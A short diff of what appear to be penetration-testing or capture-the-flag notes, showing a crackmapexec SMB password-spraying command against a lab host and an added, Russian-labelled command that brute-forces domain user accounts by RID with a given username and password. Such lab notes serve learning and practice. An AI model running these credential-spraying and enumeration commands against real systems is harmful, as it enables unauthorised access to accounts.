@@ -166,3 +166,6 @@ Steven,Kerb
 
 crackmapexec smb streamio.htb -u users.txt -p passwords.txt
 
+		---- Брут пользователей по RID (относительный идентификатор)
+
+crackmapexec smb 10.10.10.149 -u Hazard -p stealth1agent --rid-brute
